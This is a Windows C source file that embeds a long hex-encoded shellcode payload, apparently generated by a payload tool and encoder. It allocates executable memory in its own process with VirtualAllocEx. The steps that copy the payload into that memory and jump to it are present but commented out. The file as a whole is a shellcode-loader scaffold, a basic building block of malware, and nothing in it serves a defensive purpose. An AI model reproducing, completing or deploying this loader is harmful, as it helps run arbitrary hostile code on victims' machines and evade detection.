#include <windows.h>
#include <stdio.h>
#include <tchar.h>

void _tmain(int argc, TCHAR* argv[])
{

    //Final size of c file: 2807 bytes
    unsigned char my_var[] =
        "\xbd\x0d\xca\x1f\x7c\xda\xd6\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
        "\xac\x31\x68\x12\x03\x68\x12\x83\xcd\xce\xfd\x89\x31\x86\x82"
        "\x96\x39\xff\x49\x56\xb9\x00\x13\x06\xf8\x50\xc1\xe0\xcb\x82"
        "\xb4\x95\x63\xa8\x65\x36\x25\xe6\x02\xe4\xd1\xbe\x9f\x5b\xc1"
        "\x73\x91\x92\x49\x83\x66\x6e\x03\xd3\x03\x1d\xc3\xab\x22\x22"
        "\x4f\x17\x24\xde\x8d\x44\x86\x5f\x50\x5d\xcb\x1e\x53\x9f\x36"
        "\x4d\x01\x57\x3c\xdc\x85\xec\x00\xdd\x84\xa3\xcc\x1c\xd6\x22"
        "\x4c\x66\xce\xa1\x4c\x98\x6b\xc7\x50\xa6\x73\xa3\xd1\x2e\x73"
        "\xb3\xd1\x66\xf6\x73\xa5\x11\xb0\x72\x96\x8e\x04\xfe\x56\x0f"
        "\x0f\x48\x4f\x06\x0e\x99\x8c\xce\x5d\x28\x9a\xa7\xa2\x83\x5d"
        "\xb3\x68\x9c\x16\xc2\x46\xd4\x97\x04\x27\x24\x1e\x89\x0b\xe7"
        "\xa0\x53\x6b\x08\xd7\xa2\xc7\xcb\x54\x61\xdf\x8e\x5d\xb8\xaa"
        "\xc8\xc6\x7e\xdf\xa9\xd2\x37\xde\xf9\x7d\x89\x6b\xf5\xc9\x4d"
        "\xe0\x46\xd6\x04\xf7\x96\xa7\x1d\xf3\x9e\x60\x23\x2b\xdf\x28"
        "\x62\x93\xbe\x91\x3e\x62\x67\x63\xe6\x25\xcd\x2b\x9b\x49\xd1"
        "\xea\xc9\x6e\xf2\xb5\xac\xc9\xa9\x0d\xa4\xfb\xa4\xc5\x45\x04"
        "\xc9\x87\xf1\xcb\xed\x6b\x4b\x95\x65\xe5\x25\x80\xe7\x90\xcd"
        "\x52\xb9\x0c\x66\xdb\xd8\xf8\xb1\x19\x56\x8c\x1b\x9a\x98\xa7"
        "\x37\xf7\x2e\xc1\x59\xa4\xf4\x9c\xa8\x8a\x44\x2e\x02\x59\x04"
        "\x19\x2e\x67\xfc\xe0\xe9\x97\x00\x13\xf6\x68\xd5\xfb\xfa\x96"
        "\xd6\xfb\x33\xa1\xe4\xd5\x02\xfb\x26\x1b\x4b\x31\x04\x5b\xc9"
        "\x7d\xe3\x9a\xa4\xba\x33\x13\x10\x44\xb4\x61\x6f\x8d\xe7\x2a"
        "\xe5\x0e\x5b\x84\x43\x47\xd2\x89\x72\x67\xe4\xb5\x7a\x98\x31"
        "\x5d\xff\x66\xba\x9e\x2f\x22\x8d\xc9\x45\xfc\x92\x9b\xd0\x53"
        "\x17\x31\xb2\x6b\xef\xf1\x4c\xdf\x77\x5d\xce\x96\xc6\x11\x61"
        "\x1a\x8a\xe0\xeb\x0e\x7d\x44\xa5\xc9\x05\x3d\x5b\x66\xc7\x87"
        "\x94\xc4\x57\x6d\x8b\xbf\xa2\x3a\x1b\x0e\xa5\xf3\x1a\x45\x45"
        "\xb3\xca\xf0\xc8\x26\xbe\xcb\x5d\xf0\x28\x4f\x14\x51\xcd\xb8"
        "\xaf\x19\x68\xa5\x00\xe4\x1f\x5c\xd6\xb7\x89\xca\xbc\x0f\x54"
        "\x80\x0c\xf4\xf6\x1e\x40\x9c\x4a\xe9\xcb\x2d\x36\x78\x89\x92"
        "\xd1\xea\x25\x77\x66\x93\xb1\xb0\x16\x20\x73\xc8\xe0\xd5\xf3"
        "\x7e\x6e\x2c\x99\x0e\x2a\x36\x29\xbc\xae\xa3\xc8\x0f\x6c\x44"
        "\x71\xda\x72\xd2\x0c\x1b\x21\xb8\x4f\xc4\x8b\x0d\x99\xa7\x5b"
        "\xd5\x19\x7a\xf4\xa1\x1a\x7a\x04\xa9\x4a\x29\x57\xe0\xad\x0f"
        "\xbc\xa7\x1f\xab\xbc\x92\x28\x42\x84\x76\xa3\x0b\x41\x0f\x42"
        "\xd9\x4e\x55\xf7\x76\xf1\x5a\xf7\x86\xb8\x15\x17\xec\x3e\x64"
        "\x81\xb8\x84\x13\x77\xa5\x7f\xdb\x77\xd9\x7f\x24\xa2\x94\x4e"
        "\x1a\x1e\x7d\xf9\x13\x50\xcc\xc8\xea\xde\xfe\xe3\xbf\xb3\x49"
        "\x33\xfd\x19\x4c\xa3\x7a\x9d\x85\x56\xbc\x14\x39\x11\xfb\x16"
        "\xcd\xb2\x03\x99\x87\x0e\x47\x69\x22\x8f\x47\x89\x4d\x4f\xb8"
        "\x5c\x05\xb0\x89\x2b\x94\xa5\xbf\x3c\xcd\x39\xbf\xbc\xbd\x60"
        "\xd5\xfc\x1b\xda\xa0\x2c\x5a\x3e\xa2\x87\x9a\x7f\xc2\x07\x25"
        "\x80\x8b\x9d\x7d\x24\x58\x07\x7d\x24\x5e\xc7\x81\xf1\x16\x54"
        "\x2e\xa9\xee\xd3\x36\x05\x67\x12\xf0\x1f\xad\x9c\xc6\xe0\x51"
        "\x3f\xc9\xe0\x18\xb6\x30\xa9\x20\xda\x54\xa3\xb6\xdb\x58\xb4"
        "\x36\x23\x8d\xfc\xb5\x1f\x0e\x78\x79\xeb\xfd\xe4\xf2\x13\x4a"
        "\xe8\xc7\x99\x8a\x9f\x15\xf9\xc9\x38\xf3\xfa\x94\xf1\xc4\x39"
        "\xd6\xb7\x68\xeb\xe8\x6d";

  
    HANDLE hProcess = GetCurrentProcess();
    void* pShellcode;
    pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(my_var), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    /*
    memcpy(pShellcode, my_var, sizeof(my_var) - 1);
    int (*func)();
    func = (int (*)()) pShellcode;
    //sleep(1000);
    //(*func)();

    */
}